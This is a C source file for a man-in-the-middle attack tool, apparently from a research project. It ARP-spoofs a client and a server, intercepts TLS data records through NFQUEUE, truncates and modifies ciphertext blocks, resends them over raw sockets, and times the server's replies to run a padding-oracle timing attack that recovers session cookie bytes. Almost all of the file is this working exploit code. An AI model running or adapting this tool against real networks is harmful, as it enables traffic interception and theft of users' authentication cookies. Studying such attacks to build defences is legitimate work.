#define _GNU_SOURCE
#include "../include/utility.h"
#include "../include/network.h"
#include "../../stats/stats.h"
#include <signal.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <time.h>
#include <linux/netfilter.h>
#include <pcap.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

void extract_mode();
void extract_network_config();

// network
void setup_nfq(struct nfq_handle **h, struct nfq_q_handle **qh);
void intercept_packets();
static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payload_len);
static inline struct tcphdr *extract_tcp_header(Byte *payload, unsigned int payload_len, unsigned int iphdr_len);
static inline Byte *extract_application_data(Byte *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size);
void *do_attack_thread(void *arg);
static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data);
void stampa_cookie();
static bool is_tls_record(const Byte *payload, unsigned int application_payload_len);
static bool is_tls_handshake(const Byte *payload, unsigned int application_payload_len);
static bool is_tls_data(const Byte *payload, unsigned int application_payload_len);
int update_tls_record_for_truncation(Byte *application_payload, unsigned int *application_payload_size);



static inline uint64_t rdtsc() {
  unsigned int lo, hi, aux;
  __asm__ __volatile__ ("rdtscp" : "=a"(lo), "=d"(hi), "=c"(aux));
  return ((uint64_t)hi << 32) | lo;
}


char *active_interface;
Data_packet *data_packet;
pthread_cond_t attack_thread_cond = PTHREAD_COND_INITIALIZER;
pthread_mutex_t attack_thread_mutex = PTHREAD_MUTEX_INITIALIZER;
bool attack;
Byte cookie[1000];
int cookie_index = 0;
pcap_t *pcap_handle;
Byte val_penultimate_byte = 0x00; //questo ed il successivo servono per la modifica degli ultimi 2 byte (magari successivamente fare la versione in cui vengono passati come parametri)
Byte val_last_byte = 0x00;
Byte single_byte = 0x00;  //serve per la modifica del singolo byte 

#define DIM_PAGE 4096

char my_ip[INET_ADDRSTRLEN];
char gateway_ip[INET_ADDRSTRLEN];
char ip_client[INET_ADDRSTRLEN];
char ip_server[INET_ADDRSTRLEN];
int port_server = 5000;
char network_config;
char op_mode;

int main(int argc, char *argv[]) {

  pthread_t attack_thread;
  attack = false;

  if (argc < 3) {
    perror("Missing arguments! \n");
    return 0;
  }

  // -d (creazione dstaset), -a (attaccante vero e proprio)
  if(argv[1][0] == '-'){
    op_mode = argv[1][1];
  }

  if(argv[2][0] == '-'){
    network_config = argv[2][1];
  }

  data_packet = init_data_packet();
  
  printf("Operation mode: %c. Network config: %c \n", op_mode, network_config);

  //extract_network_config(); 
  catch_signals();
  //variabili condizionali per sleep e risveglio del thread

  // selecting the operation mode
  switch(network_config){
    case 'l':
      strncpy(ip_client, "10.0.0.2", INET_ADDRSTRLEN);
      strncpy(ip_server, "10.0.0.1", INET_ADDRSTRLEN); 
      printf("LocalHost/Lan configuration selected \n");
      break;
    case 'n':
      get_network_info(my_ip, gateway_ip);
      printf("Mio indirizo ip locale: %s \n indirizzo ip default gateway: %s \n", my_ip, gateway_ip);
      //extract ip client by the passed arguments
      if(argc < 5){
        perror("Missing arguments!");
        exit(EXIT_FAILURE);
      }
      strncpy(ip_client, argv[3], INET_ADDRSTRLEN);
      strncpy(ip_server, argv[4], INET_ADDRSTRLEN);
      printf("LAN network configuration selected \n");
      arp_spoofing(ip_client, ip_server);
      arp_spoofing(ip_server, ip_client);
      break;
    case 'i':
      if(argc < 4){
        perror("Missing arguments!");
        exit(EXIT_FAILURE);
      }
      printf("Internet network configuration selected \n");
      break;
    case 'm':
      strncpy(ip_client, "127.0.0.1", INET_ADDRSTRLEN);
      strncpy(ip_server, "127.0.0.1", INET_ADDRSTRLEN);
      break;
    default:
      fprintf(stderr, "Invalid network configuration flag! \n");
  }

  printf("Mio indirizzo ip: %s \n indirizzo ip default gateway: %s \n", my_ip, gateway_ip);

  printf("Starting MITM proxy \n");

  active_interface = get_server_interface(ip_server, port_server);

  if(active_interface == NULL){
    perror("Error in getting server interface! \n");
    exit(EXIT_FAILURE);
  }
  disable_hardware_offloading(active_interface);

  pcap_handle = setup_pcap(active_interface, ip_server, port_server);

  if(pcap_handle == NULL){
    perror("error in pcap handle setup ");
    exit(EXIT_FAILURE);
  }
  init_python_environment();

  pthread_create(&attack_thread, NULL, do_attack_thread, NULL);
  setup_network_interception();
  intercept_packets();

  return 0;
}

//function to extrract the network configuration by network configuration parameter
void extract_network_config() {

  switch (network_config) {
  case 'l':
    strncpy(ip_client, "10.0.0.2", INET_ADDRSTRLEN);
    strncpy(ip_server, "10.0.0.1", INET_ADDRSTRLEN); 
    printf("LocalHost/Cavo Diretto configuration selected \n");
    break;
  case 'n':
    get_network_info(my_ip, gateway_ip);
    printf("LAN network configuration selected \n");
    break;
  case 'i':
    printf("Internet network configuration selected \n");
    break;
  default:
    fprintf(stderr, "Invalid netowkr configuration flag! \n");
  }
}

//function to initialize nfq (NFQUEUE)
void setup_nfq(struct nfq_handle **h, struct nfq_q_handle **qh){

  *h = nfq_open();

  if(!(*h)){
    perror("Error in the NFQUEUE opening! \n");
    exit(EXIT_FAILURE);
  }

  *qh = nfq_create_queue(*h, 0, &packet_verdict_handler, NULL);

  if(!(*qh)){
    perror("Error in the NFQUEUE creation! \n");
    exit(EXIT_FAILURE);
  }

  if(nfq_set_mode(*qh, NFQNL_COPY_PACKET, 0xffff) < 0){
    perror("Error in the NFQUEUE mode setting! \n");
    exit(EXIT_FAILURE);
  }

}

//forse da spostare in network.c
void intercept_packets() {

  struct nfq_handle *h;
  struct nfq_q_handle *qh;
  int fd;
  int rcv;
  char buffer[DIM_PAGE] __attribute__((aligned));

  setup_nfq(&h, &qh);

  fd = nfq_fd(h);

  do{
    rcv = recv(fd, buffer, sizeof(buffer), 0);
    if(rcv > 0){
      nfq_handle_packet(h, buffer, rcv);
    }
    printf("rcv: %d \n", rcv);
  }while(rcv > 0);

}

//function to determinate the sort of a packet
static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){

  struct nfqnl_msg_packet_hdr *ph; 
  Byte *payload;
  unsigned int payload_len;
  uint32_t id;
  struct iphdr *ip_header;
  unsigned int iphdr_size;
  struct tcphdr *tcp_header;
  unsigned int tcphdr_size;
  Byte *application_payload;
  unsigned int application_payload_size;

  ph = nfq_get_msg_packet_hdr(nfa);
  id = ntohl(ph->packet_id);

  payload_len = nfq_get_payload(nfa, &payload);
  printf("Packet data: ID=%u, %d bytes \n", id, payload_len);

  ip_header = extract_ip_header(payload, payload_len);
  iphdr_size = ip_header->ihl << 2; 

  if(ip_header->protocol == IPPROTO_TCP){
    tcp_header = extract_tcp_header(payload, payload_len, iphdr_size);
    printf("TCP packet detected! Source port: %d, Destination port: %d \n", ntohs(tcp_header->source), ntohs(tcp_header->dest));
    tcphdr_size = tcp_header->doff << 2;

    application_payload = extract_application_data(payload, payload_len, iphdr_size, tcphdr_size);
    application_payload_size = payload_len - iphdr_size - tcphdr_size;

    //SSL/TLS handshake message
    if(is_tls_handshake(application_payload, application_payload_size)){
      printf(ANSI_COLOR_GREEN "SSL/TLS handshake packet detected! \n" ANSI_COLOR_RESET);
      return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }

    //SSL/TLS data message
    if(is_tls_data(application_payload, application_payload_size)){
      printf(ANSI_COLOR_BLUE "SSL/TLS data packet detected! \n" ANSI_COLOR_RESET);
      
      //print_application_data(application_payload, application_payload_size);

      //devo effettuare il troncamento a 341 byte
      if(application_payload_size > data_dimension){
        //da capire come mai non funziona
        int diff = update_tls_record_for_truncation(application_payload, &application_payload_size);
        payload_len -= diff;
        ip_header->tot_len = htons(payload_len); 
      }

      if(application_payload_size > 0){
        //printf("Printing of the data \n");
        //print_application_data(application_payload, application_payload_size);

        if(check_data_length(application_payload, application_payload_size) == false){
          fprintf(stderr, "Data length is not correct! \n");
          return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
        }

        //ALLOCAZIONE ED INIZIALIZZAZIONE DEL PACCHETTO DATA_LENGTH (VARIABILE GLOBALE) E DEI SUOI CAMPI (IP HEADER, TCP HEADER, APPLICATION DATA)

        pthread_mutex_lock(&attack_thread_mutex);

        if(attack == true){
          pthread_mutex_unlock(&attack_thread_mutex);
          return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
        }

        if(data_packet == NULL){
          fprintf(stderr, "Error: data_packet is NULL! \n");
          exit(EXIT_FAILURE);
        }

        if(payload_len > data_packet->capacity){
          size_t new_capacity = data_packet->capacity * 2;
          while(new_capacity < payload_len) {
            new_capacity *= 2;
          }

          data_packet->packet = (Byte *)realloc(data_packet->packet, new_capacity * sizeof(Byte));
          
          if(data_packet->packet == NULL){
              perror("Errore realloc su data_packet->packet!\n");
              exit(EXIT_FAILURE);
          }

          //capacity is size_t not a pointer
          data_packet->capacity = new_capacity; 

        }

        memcpy(data_packet->packet, payload, payload_len); 
        data_packet->len = payload_len;

        data_packet->ip_header = (struct iphdr *)data_packet->packet;
        data_packet->ip_header_len = iphdr_size;

        data_packet->tcp_header = (struct tcphdr *)(data_packet->packet + iphdr_size);
        data_packet->tcp_header_len = tcphdr_size;

        data_packet->data = (Byte *)(data_packet->packet + iphdr_size + tcphdr_size);
        data_packet->data_len = application_payload_size;

        attack = true;
        pthread_cond_signal(&attack_thread_cond);
        pthread_mutex_unlock(&attack_thread_mutex);
      }

      return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
    }
  } 

  return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
}

//function to extract the IPayload header from the packet p
static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payload_len){
  struct iphdr *ip_header;
  if(payload_len < sizeof(struct iphdr)){
    //fprintf(stderr, "Payload too small to contain an IP header! \n");
    return NULL;
  }
  ip_header = ((struct iphdr *)payload);

  return ip_header;
}

//function to extract the TCP header from the packet payload
static inline struct tcphdr *extract_tcp_header(Byte *payload, unsigned int payload_len, unsigned int iphdr_len){
  struct tcphdr *tcp_header;
  if(payload_len < (iphdr_len + sizeof(struct tcphdr))){
    //fprintf(stderr, "Payload too small to contain a TCP header! \n");
    return NULL;
  }
  tcp_header = ((struct tcphdr *)(payload + iphdr_len));

  return tcp_header;
}

//function to extract the application data from the packet payload
static inline Byte *extract_application_data(Byte *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size){
  Byte *application_data;
  if((payload_len <= (iphdr_size + tcphdr_size))){
    //fprintf(stderr, "Payload too small to contain application data! \n");
    return NULL;
  }

  application_data = ((char *)payload + iphdr_size + tcphdr_size);
  return application_data;
}

//check if the payload is a TLS record (handshake or data)
static bool is_tls_record(const Byte *payload, unsigned int application_payload_len){
  bool is_tls = false;

  if(payload == NULL || application_payload_len < 3){
    return is_tls;
  }

  //check if it's a TLS record 
  if(payload[1] == 0x03 && (payload[2] == 0x01 || payload[2] == 0x02 || payload[2] == 0x03)){
    is_tls = true;
  }
    
  return is_tls;
}

//check if the payload is a TLS handshake record (0x16)
static bool is_tls_handshake(const Byte *payload, unsigned int application_payload_len){
  bool is_handshake = false;

  bool is_tls = is_tls_record(payload, application_payload_len);

  if(is_tls && payload[0] == 0x16){
    is_handshake = true;
  }

  return is_handshake;
}

//check if the payload is a TLS data record (0x17)
static bool is_tls_data(const Byte *payload, unsigned int application_payload_len){
  bool is_data = false;

  bool is_tls = is_tls_record(payload, application_payload_len);

  if(is_tls && payload[0] == 0x17){
    is_data = true;
  }

  return is_data;
}

void modify_packet(bool first_modification){

  int block_pos = (data_packet->data_len - 5 - BLOCK_DIM) / BLOCK_DIM;
  block_pos -= 1;
  if(first_modification){
    modify_last_bytes(data_packet, block_pos, val_penultimate_byte, val_last_byte);
    if(val_last_byte == 0xFF){
      val_last_byte = 0x00;
      val_penultimate_byte = (val_penultimate_byte +1) % 0x100;
    }else{
      val_last_byte = (val_last_byte + 1) % 0x100;
    }
  }else{ //to enter in this branch first_attack must be false
    Byte original_c15 = data_packet->data[5 + ((4-1) * BLOCK_DIM) + 15];
    Byte known_plain = cookie[cookie_index-1];
    Byte expected_padding = 0x01;

    data_packet->data[5 + (block_pos * BLOCK_DIM) + (BLOCK_DIM -1)] = original_c15 ^ known_plain ^ expected_padding;
    data_packet->data[5 + (block_pos * BLOCK_DIM ) + (BLOCK_DIM -2)] = single_byte; 
    if(single_byte == 0xFF){
      single_byte = 0x00;
    }else{
      single_byte = (single_byte + 1) % 0x100;
    }
  }

  print_blocks(data_packet->data, data_packet->data_len);
}

//function to truncate the packet and return the difference between the original packet length and the new packet length
int update_tls_record_for_truncation(Byte *application_payload, unsigned int *application_payload_size){
  int diff = *application_payload_size - data_dimension;
  if(diff > 0){
    *application_payload_size = data_dimension;
    uint16_t new_tls_len = *application_payload_size - 5;
    printf("new tls len: %d \n", new_tls_len); 
    application_payload[3] = (new_tls_len >> 8) & 0xFF; 
    application_payload[4] = new_tls_len & 0xFF;
  }

  return diff;
}

//function to recalculate the TCP checksum (provare dopo a spostarla in utility.c passando come paramento const Data_packet **)
unsigned short recalculate_checksum(){

  unsigned long sum = 0;
  unsigned short checksum = 0;
  uint16_t tcp_total_len = data_packet->tcp_header_len + data_packet->data_len;

  //create the Ip Pseudo Header
  sum += (data_packet->ip_header->saddr >> 16) & 0xFFFF;
  sum += (data_packet->ip_header->saddr) & 0xFFFF;
  sum += (data_packet->ip_header->daddr >> 16) & 0xFFFF;
  sum += (data_packet->ip_header->daddr) & 0xFFFF;
  sum += htons(tcp_total_len) & 0xFFFF;
  sum += htons(IPPROTO_TCP) & 0xFFFF;

  unsigned short *ptr = (unsigned short *)data_packet->tcp_header;
  int byte_left = ((int)(data_packet->tcp_header_len));

  data_packet->tcp_header->check = 0;
  while(byte_left > 1){
    sum += *ptr;
    ptr++;
    byte_left-=2;
  }

  if(byte_left == 1){ //we need padding
    sum += (0x0000 | *(unsigned char *)ptr) & 0xFFFF;
  }
  printf("%#lx\n",sum);

  ptr = ((unsigned short *)data_packet->data);
  byte_left = ((int)(data_packet->data_len));

  while(byte_left > 1){
    sum += *ptr;
    ptr++;
    byte_left-=2;
  }

  if(byte_left == 1){ //we need padding
    sum += (0x0000 | *(unsigned char *)ptr) & 0xFFFF;
  }
  printf("%#lx\n",sum);

  
  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  } 
  
  /*
  do{
    sum = ((sum & 0xFFFF) + (sum >> 16) & 0xFFFF);
  }while((sum >> 16) != 0);  */
  
  checksum = ~sum & 0xFFFF;
  
  return checksum;
}

//function to send the modified packet to the server
void send_modified_packet(uint64_t *start){
  int smp_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  int hincl = 1;
  int mark = 1;

  if(smp_fd < 0){
    perror("Socket creation error! \n");
    return;
  }
  
  if(setsockopt(smp_fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl)) < 0){
    perror("IP_HDRINCL setting error");
  }

  if(setsockopt(smp_fd, SOL_SOCKET, SO_MARK, &mark, sizeof(mark)) < 0){
    perror("SO_MARK setting error");
  }

  char *raw_packet;
  
  unsigned int total_packet_length = data_packet->ip_header_len + data_packet->tcp_header_len + data_packet->data_len;
  raw_packet = (char *) malloc(total_packet_length);

  memcpy(raw_packet, data_packet->ip_header, data_packet->ip_header_len);
  memcpy(raw_packet + data_packet->ip_header_len, data_packet->tcp_header, data_packet->tcp_header_len);
  memcpy(raw_packet + data_packet->ip_header_len + data_packet->tcp_header_len, data_packet->data, data_packet->data_len);

  struct sockaddr_in server_addr;
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = data_packet->ip_header->daddr;
  server_addr.sin_port = data_packet->tcp_header->dest;

  //printf("ho creato l'indirizzo ora spedisco il pacchetto al server! \n");


  //DA CAMBIARE
  *start = rdtsc();
  sendto(smp_fd, raw_packet, total_packet_length,0, (struct sockaddr *)&server_addr, sizeof(server_addr));

  //printf("pacchetto mandato al server! \n");

  free(raw_packet);
  close(smp_fd);
}

//thread function to perform attack
void *do_attack_thread(void *arg){

  char *server_interface = get_server_interface(ip_server, port_server);
  bool first_attack = true;
  unsigned long long n_attemps = 0;
  struct first_attack_result *fa_result = calloc(1, sizeof(struct first_attack_result));
  struct attack_result *a_result = calloc(1, sizeof(struct attack_result));
  Byte expected_padding = 0x01; 
  bool allocated = false;
  Data_packet *original_packet = NULL;  //mi serve per poi effettuare lo xor e ricostruire il valore in chiaro del byte che sto cercando di indovinare

  if(!fa_result || !a_result) {
    perror("Errore di allocazione memoria per le matrici!");
    exit(EXIT_FAILURE);
  }

  //printf("server interface: %s", server_interface);

  while(1){
    pthread_mutex_lock(&attack_thread_mutex);
    while(attack == false){
      pthread_cond_wait(&attack_thread_cond, &attack_thread_mutex);
    }
    pthread_mutex_unlock(&attack_thread_mutex);

    if(original_packet == NULL && !allocated){
      original_packet = (Data_packet *)calloc(1, sizeof(Data_packet));
      if(original_packet == NULL){
        perror("Error allocating memory for original_packet! \n");
        exit(EXIT_FAILURE);
      }

      allocate_packet(data_packet, original_packet);
      allocated = true;
    }

    clone_packet(data_packet, original_packet);
    modify_packet(first_attack);

    data_packet->tcp_header->check = recalculate_checksum();

    data_packet->ip_header->check = recalculate_ip_checksum(data_packet->ip_header);

    //printf("Checksum: %04x \n", checksum);
   
    flush_pcap_buffer(pcap_handle);
         
    uint64_t start_cycles;
    send_modified_packet(&start_cycles);
    uint64_t stop_cycles =  get_server_response_time(pcap_handle, start_cycles);

    if(stop_cycles == 0){
      printf("Server didn't reply \n");
      attack = false;
      continue;
    }

    long long delta = stop_cycles - start_cycles;
    printf("Reply delta time: %llu \n", delta);

    int column, row;
   
    if(first_attack){
      column = (int)(n_attemps / (256 * 256));
      row = n_attemps - (256 * 256 * column);
      fa_result->time_meas[row][column] = (int64_t)delta;
      n_attemps++;

      if(n_attemps == ((unsigned long long)L_SIZE * 256 * 256)){
        n_attemps = 0;
        first_attack = false;

        int byte_guess = analyze_double_bytes(fa_result);
        printf("sono dopo alla funzione analyze_double_byte! \n");
        Byte guessed_penultimate = (byte_guess >> 8) & 0xFF;
        Byte guessed_last = (byte_guess & 0xFF);
        printf("penultimate byte: 0x%02x last byte: 0x%02x\n", guessed_penultimate, guessed_last);

        int block_pos = (data_packet->data_len - 5 - BLOCK_DIM)/BLOCK_DIM;
        block_pos -= 1;

        int block_offset = 5 + (block_pos * BLOCK_DIM); 
        
        //original packet è sostanzialmente un clone del pacchetto data_packet prima della modifica, quindi contiene i byte originali del pacchetto
        Byte *original_packet_data = original_packet->data;
        Byte original_ciph_penultimate = original_packet_data[block_offset + 14]; 
        Byte original_ciph_last = original_packet_data[block_offset + 15];
        

        printf("Valore del penultimo byte: 0x%02x", guessed_penultimate);
        printf("Valore dell'ultimo byte: 0x%02x", guessed_last);

        Byte plain_penultimate = expected_padding ^ guessed_penultimate ^ original_ciph_penultimate;
        Byte plain_last = expected_padding ^ guessed_last ^ original_ciph_last;
        
        printf("Plaintext Penultimo: 0x%02x (ASCII: %c)\n", plain_penultimate, plain_penultimate);
        printf("Plaintext Ultimo:    0x%02x (ASCII: %c)\n", plain_last, plain_last);

        /*DEBUGGING
          so che gli ultimi 2 byte del plaintext sono 0x38 (8) e 0x39 (9)
          per ottenere 0x01 0x01 so che i byte che devo iniettare sono
        */
        
        Byte expected_last_byte = 0x01 ^ 0x39 ^ original_ciph_last;
        Byte expected_penultimate_byte = 0x01 ^ 0x038 ^ original_ciph_penultimate; 

        /*
        Byte expected_last_byte = 0x39;
        Byte expected_penultimate_byte = 0x38; */

        printf("I byte che l'analisi statistica deve scegliere sono: \n last_byte: 0x%02x \n penultimate_byte: 0x%02x \n ", expected_last_byte, expected_penultimate_byte);
        
        //stampare i valori delle mediane delle statistica
        cookie[cookie_index] = guessed_last;
        cookie[cookie_index +1] = guessed_penultimate;
        cookie_index+=2;
      }
    }else if(first_attack == false){
      column = (int)(n_attemps / 256); 
      row = n_attemps - (column * 256);
      a_result->time_meas[row][column] = delta;
      n_attemps++;
      if(n_attemps == (L_SIZE * 256)){
        n_attemps = 0;

        int guessed_byte = analyze_single_byte(a_result);
        printf("guessed byte: 0x%02x \n", guessed_byte);

        int block_pos = (original_packet->data_len - 5 - BLOCK_DIM) / BLOCK_DIM;
        int plain_byte = expected_padding ^ guessed_byte ^ original_packet->data[5 + (block_pos * BLOCK_DIM ) + 14];
        printf("Plaintext byte: 0x%02x (ASCII: %c)\n", plain_byte, plain_byte);
        //aggiungere il byte in chiaro al cookie e tenerne traccia per la modifica successiva
        cookie[cookie_index] = plain_byte;
        cookie_index++;
      }
      
    }

    printf("STAMPA COOKIE \n");
    stampa_cookie();

    attack = false;
  }

  stampa_cookie();

  free(fa_result);
  free(a_result);
  free(original_packet->packet);
  free(original_packet->ip_header);
  free(original_packet->tcp_header);
  free(original_packet->data);
  free(original_packet);

  //close(pcap_handle);
}


void stampa_cookie(){
  printf("Cookie: ");
  for(int i=(cookie_index - 1) ; i>=0; i--){
    char c = (cookie[i] >= 32 && cookie[i] <= 126) ? cookie[i] : '.';
    printf("%02x(%c) ", cookie[i], c);
  }
  printf("\n");
}



